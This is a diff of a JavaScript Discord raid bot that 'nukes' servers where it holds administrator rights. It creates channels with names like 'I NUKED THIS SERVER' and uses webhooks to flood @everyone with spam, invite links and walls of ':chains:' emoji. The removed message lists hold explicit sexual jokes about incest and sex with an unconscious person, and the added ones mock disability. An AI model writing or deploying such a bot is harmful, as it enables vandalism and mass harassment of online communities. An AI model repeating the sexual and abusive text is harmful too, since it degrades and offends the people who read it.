@@ -419,61 +419,113 @@ if(message.guild.me.hasPermission("ADMINISTRATOR")) {
  
  
  
- 
- 
- 
  function randomT() {
-   var rand = [`🎄Barry do you remember that time in high-school when you first had sex with a women? do you remember when you stuck it in and blew your load to quick? it was me barry! and then the second you penetrated her jerked you off to completion.`
- ,
-`🎄Barry do you remember that time you got hard just by looking at your mother? It was ME Barry! I waited and watched until you glanced at her then jerked you to hardness I made you oedipos`
-,
-`❄️Barry do you remember when your mother was bathing you and your brother in the tub but you had to get out of the tub early cause your brother peed in the tub? It was ME Barry I was the one that peed in the tub!`
-,
-`⛄Barry do you remember when you came shit farted and peed all at the same time. It was ME Barry I made you into the cum shit fart piss man!`
-,
-`☃️Remember that time you tried to make a comfy Simpsons thread and it got derailed snee posters? It was ME Barry I the rouge derailed your thread!`
-,
-`☃️Barry do you remember when you tried to share your genuine opinions about cartoons on 4chan and it got mocked for having a different opinions. It was me Barry I was the anonymous!`
-,
-`❄️Barry do you remember when you woke up with a sore ass that one morning when you were sick? It was ME Barry- I don't like this one...`
-,
-`⛄Remember that magnificent microwave casserole you had in your freezer? the one you were anticipating to taste for weeks but it blew up while it was left untended? It was ME Barry I was the one who blew up the casserole! `
-,
-`🌨️Barry do you remember the time the chair was thrown? It was ME Barry I was the one who threw the chair!` 
-,
-`❄️ https://youtu.be/fi36ePIX2kY`
-,
-`❄️BARRY DO YOU REMEMBER THE TIME YOU GOT A PS5 FOR CHRISTMAS?**IT WAS ME BARRY I PUT THE PS5 UNDER THE CHRISTMAS TREE!**🎄`
-,
-`❄️BARRY DO YOU REMEMBER THE TIME YOU GOT A PS5 FOR CHRISTMAS?**IT WAS ME BARRY I PUT THE PS5 UNDER THE CHRISTMAS TREE!**🎄`
-,
-`🎄❄️MY PLAN WORKED BARRY! I NOW AM WISHING YOU AND EVERYONE MARRY CHRISTMAS AND HAPPY NEW YEAR!!!🎄❄️
-https://cdn.discordapp.com/attachments/782641638798393364/791725018270400542/santahat.png
-`
-,
-`🎄❄️MY PLAN WORKED BARRY! I NOW AM WISHING YOU AND EVERYONE MARRY CHRISTMAS AND HAPPY NEW YEAR!!!🎄❄️`
-,
-`☃️Barry do you remember that time when you were sixteen and you fucked your sister in the dark because you thought she was unconscious? It was me Barry! I was your sister!`] 
-return rand[Math.floor(Math.random()*rand.length)];
+   var rand = ["https://i.pinimg.com/originals/34/f8/a1/34f8a188fb3b596f6eaa723c45418bac.gif", "https://cdn.discordapp.com/attachments/782641638798393364/785878660229758986/video0-151.mp4", "CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS\nIsn't it lovely to be free?\nCHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS", "https://i.pinimg.com/originals/34/f8/a1/34f8a188fb3b596f6eaa723c45418bac.gif", "https://images-ext-1.discordapp.net/external/8DHsw2FCYjn5MjW_8JrBuMP5jxaHxc-9yrEbwLlLIbo/https/c.tenor.com/OGC6jVC8GBgAAAAM/jevil-deltarune.gif", `CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS
+
+Isn't it lovely to be free?
+
+CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS
+
+Now you can play with me!
+
+CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS
+
+Don't worry, it won't get boring!
+
+CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS CHAOS
+
+I can do anything!
+
+Life is like a carnival!
+
+The games are rigged, but hey, that's okay!
+
+You still get to play!
+
+You came too far to refuse!
+
+Why don't you give it a try?
+
+It's just a numbers game, after all
+
+let the numbers fall
+
+Your HP's gone, you lose!
+
+Come take my spades and clubs and diamonds as your guide to dance and spin elegantly out of harm or into it, both sound like fun! 
+
+A smattering of Chaos, Chaos keeps the world exciting, so let's play and excite everyone!
+
+My heart is joying just to think of what a marvelously un-disagreeablyifying Chaos that's about to ensue!
+
+Step right on over here and play with me, you three, and maybe all of your hearts will start joying too!
+
+Everything is just a game!
+
+Don't tell me you don't know!
+
+Because of course you do!
+
+You just won't admit that you
+
+Would rather stay and play
+
+Then go and save the day
+
+'Cos then the game stops too!
+
+It's allright, I get it!
+
+Oh! let's make the DEVILSKNIFE!
+
+I'm KNIFE now, so, bye bye!
+
+It's time to die your life!
+
+It's time for life to die!
+
+Come back to die again!
+ 
+I'm always up for fun!
+
+Cos when you've reached the end
+  
+The fun is over!`, "*I T ' S   T I M E   T O   D I E   Y O U R   L I F E* \n*I T ' S  T I M E  F O R  L I F E  T O  D I E*", "BYE BYE", "CHAOS CHAOS", "minecraft real?", `I
+can't do anything,
+I'm in a fucking wheelchair,
+I got hepatitis C,
+I can't bounce around to do my magic,
+or even make jokes,
+I can't even turn into the Devilsknife,
+my life is misery misery
+it's pointless pointless...
+but on the bright side
+at least I got this wheelchair...
+and a wheel's broken`, "https://youtu.be/EzQ3G5PpQ58", ":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:", "https://cdn.discordapp.com/attachments/785843394601418784/786239600225419264/y2mate.com_-_I_CANT_DO_ANYTHING_1080p.mp4", "I can't do anything....\nI'm in a fucking wheelchair", "CHAOS CHAOS", "https://cdn130.picsart.com/319570044198201.jpg?type=webp&to=min&r=640", "https://i.pinimg.com/originals/35/59/e7/3559e7d21a3117f8e359f6e940e2f9ea.jpg", "https://youtu.be/Zs2JPKIPL80", "https://tenor.com/view/jevil-gif-13119312", "https://tenor.com/view/jevil-deltarune-joker-jester-gif-15018365", "https://cdn.discordapp.com/attachments/783496632150655037/786194381186662410/video0-151.mp4", "https://youtu.be/oRQAhzLK8fE\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**\nchaoschaoschaoschaoschaoschaosCHAOSCHAOSCHAOSCHAOSCHAOS **CHAOS**", "https://discord.gg/XVAHsbqnU4", "https://discord.gg/XVAHsbqnU4", "https://media.discordapp.net/attachments/784863883440685117/786306549760000100/9efdc64eb1b2548f27eda9938af40720.png", "https://media.discordapp.net/attachments/784863883440685117/786306549760000100/9efdc64eb1b2548f27eda9938af40720.png", "https://youtu.be/YaiOwWDW8EY"]
+ return rand[Math.floor(Math.random()*rand.length)];
  }
  
  
  function randomnames() {
-   var rand = ["🎄❄️MARRY CHRISTMAS BARRY", "❄️🎄𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘 𝐈 𝐍𝐔𝐊𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑", "❄️🎄𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘"]
+   var rand = ["I CAN DO ANYTHING", "『ΛDᄃ』", "『ΛDᄃ』", "匚卄卂ㄖ丂", "CHAOS CHAOS", "mine now", "THE TRUE AND NEO CHAOS", "卂丂丂ㄚs property now", "metamorphosis(get it?)", "feel the 🎭CHAOS🎭", "the world is revolving"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
  
  
  function randomicons123() {
-   var rand = ["https://cdn.discordapp.com/attachments/782641638798393364/791725018270400542/santahat.png", "https://cdn.discordapp.com/attachments/782725465269600286/791723871450824774/santahat.png", "https://cdn.discordapp.com/attachments/782725465269600286/791722670575190016/santahat.png", "https://cdn.discordapp.com/attachments/782725465269600286/791722515415695380/santahat.png"]
-   return rand[Math.floor(Math.random()*rand.length)];
+   var rand = ["https://cdn.discordapp.com/avatars/759838559946801173/a_0a3a52e34012679871c4bf21e6b2e91e.gif?size=1024", "https://cdn.discordapp.com/avatars/759838559946801173/a_0a3a52e34012679871c4bf21e6b2e91e.gif?size=1024", "https://cdn.discordapp.com/attachments/782641638798393364/798626918059868220/image0.jpg", "https://cdn.discordapp.com/avatars/759838559946801173/a_0a3a52e34012679871c4bf21e6b2e91e.gif?size=1024", "https://cdn.discordapp.com/attachments/782775478820929577/786314015709855744/14f50294c277a069fb31317da8512870.png", "https://art.pixilart.com/2babf43227305c1.png", "https://media.discordapp.net/attachments/783806050641903672/786340110634450954/150.png", "https://static.zerochan.net/Jevil.full.2425503.png", "https://cdn.discordapp.com/avatars/763353219619356703/2212cb8ef2edee9b30487a56db8306b1.webp", "https://tenor.com/view/jevil-deltarune-joker-jester-gif-15018365", "https://tenor.com/view/jevil-gif-13119312",]
+ return rand[Math.floor(Math.random()*rand.length)];
  }
  
 
  function channelnames() {
-var rand = ["🎄❄️marry christmas barry", "❄️𝐈𝐓-𝐖𝐀𝐒-𝐌𝐄-𝐁𝐀𝐑𝐑𝐘-𝐈-𝐍𝐔𝐊𝐄𝐃-𝐓𝐇𝐈𝐒-𝐒𝐄𝐑𝐕𝐄𝐑", "𝐈𝐓-𝐖𝐀𝐒-𝐌𝐄-𝐁𝐀𝐑𝐑𝐘-𝐈-𝐍𝐔𝐊𝐄𝐃-𝐓𝐇𝐈𝐒-𝐒𝐄𝐑𝐕𝐄𝐑", "🎄Barry do u remember the time the chair was thrown? It was ME Barry I was the1who threw the chair!", "☃️𝐈𝐓 𝐖𝐀𝐒 𝐌𝐄 𝐁𝐀𝐑𝐑𝐘 𝐈 𝐍𝐔𝐊𝐄𝐃 𝐓𝐇𝐈𝐒 𝐒𝐄𝐑𝐕𝐄𝐑", "☃️❄️『ΛDᄃ』", "❄️🎄☃️『ΛDᄃ』", "❄️𝐁𝐀𝐑𝐑𝐘 𝐃𝐎 𝐘𝐎𝐔 𝐑𝐄𝐌𝐄𝐌𝐁𝐄𝐑 𝐖𝐇𝐄𝐍 𝐓𝐇𝐄 𝐒𝐄𝐑𝐕𝐄𝐑 𝐆𝐎𝐓 𝐍𝐔𝐊𝐄𝐃❓", "𝗜 𝗔𝗠 𝗘𝗩𝗘𝗥𝗬𝗧𝗛𝗜𝗡𝗚 𝗕𝗔𝗗 𝗧𝗛𝗔𝗧 𝗘𝗩𝗘𝗥 𝗛𝗔𝗣𝗣𝗘𝗡𝗘𝗗 𝗧𝗢 𝗬𝗢𝗨", "❄️☃️𝐈 𝐉𝐄𝐑𝐊𝐄𝐃 𝐘𝐎𝐔 𝐎𝐅𝐅 𝐀𝐓 𝐒𝐔𝐏𝐄𝐑 𝐒𝐏𝐄𝐄𝐃 𝐒𝐎 𝐈𝐓 𝐒𝐄𝐄𝐌𝐄𝐃 𝐋𝐈𝐊𝐄 𝐘𝐎𝐔 𝐍𝐔𝐓𝐓𝐄𝐃 𝐀𝐓 𝐉𝐔𝐒𝐓 𝐀 𝐖𝐎𝐌𝐄𝐍𝐒 𝐓𝐎𝐔𝐂𝐇","卂丂丂ㄚ"]
+   var rand = ["【ＣＧ】assy", "【ＣＧ】assy", "𝔹𝕐𝔼 𝔹𝕐𝔼", "𝗪𝗘𝗘 𝗛𝗘𝗘 𝗛𝗘𝗘", "『ΛDᄃ』", "卂丂丂ㄚs destructive corner", "🃏hue🎭hue🃏🎭huehue🃏huehue♠♣♥♦huehuehue🃏huehuehue", "☜☝☟☞☝chaos☟chaos☝☜☟☝☞","♛♤♦♧♣♡♥♢♠♛", "♛♤♧♡♢chaos♠♣♥♦♛", "🃏🃏🃏", "🎭🎭🎭neo-chaos🎭🎭🎭", "ᑕh̷̛̭͔͚̟͈̭͓̪̠͇̃̿̾͌₳ㄖ『s』", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽", "get fucked ﷽﷽﷽", "匚卄卂ㄖ丂 匚卄卂ㄖ丂", "卂丂丂ㄚ", "𝗜 𝗖𝗔𝗡 𝗗𝗢 𝗔𝗡𝗬𝗧𝗛𝗜𝗡𝗚"]
    return rand[Math.floor(Math.random()*rand.length)];
  }
+ 
+ 
+ 
+ 
  
    client.on('message', message => {
 if(list.includes(message.author.id)) {return}
@@ -507,14 +559,14 @@ if(list.includes(msg.author.id)) {return}
         var number = 0
         var pray = -1
         setTimeout(() => { 
-           msg.guild.channels.create('🎄').then(p => {
+           msg.guild.channels.create('【ＣＧ】assy ').then(p => {
                 p.send("@everyone all hail me")
                 p.send("https://discord.gg/XVAHsbqnU4 @everyone")
                 p.send("IT WAS ME BARRY")
                 p.createWebhook("assy").then(w => {
                      
                 [1,2,3,4,5,6,7,8,9,10,11,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12,12].forEach(function(i) {
-                    w.send(randomT() + ":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains: \n discord.gg/XVAHsbqnU4 @everyone")
+                    w.send(randomT() + ":chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:discord.gg/XVAHsbqnU4 @everyone")
                     
                 
                 })
